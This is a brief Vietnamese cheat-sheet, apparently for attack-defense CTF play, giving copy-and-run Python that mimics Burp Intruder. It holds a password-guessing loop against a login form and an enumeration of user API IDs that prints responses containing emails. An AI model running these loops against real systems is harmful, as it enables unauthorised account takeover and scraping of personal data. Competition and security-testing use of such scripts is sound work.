# Intruder -> Vòng lặp

## Snippet copy-là-chạy

```python
import time
import requests

base = "http://target"
s = requests.Session()
s.verify = False

# 1) Wordlist đơn giản (giống sniper/pitchfork đơn)
for pw in ["admin", "123456", "password"]:
    r = s.post(f"{base}/login", data={"username": "admin", "password": pw}, timeout=5)
    if "Welcome" in r.text or r.status_code == 302:
        print("FOUND", pw, r.status_code)
        break
    time.sleep(0.1)

# 2) Fuzz nhiều vị trí / payload list
ids = range(1, 50)
for i in ids:
    r = s.get(f"{base}/api/user/{i}", timeout=5)
    if r.status_code == 200 and "email" in r.text:
        print("HIT", i, r.text[:100])
```

## Lưu ý nhanh
- Bắt đầu với delay nhỏ (`time.sleep`) để tránh tự DoS/WAF.
- Chỉ in/giữ response có dấu hiệu khác biệt: status, length, chuỗi đặc trưng.
- Với cluster bomb, dùng `itertools.product(...)`; nhưng A/D thường chỉ cần 1-2 vòng lặp gọn.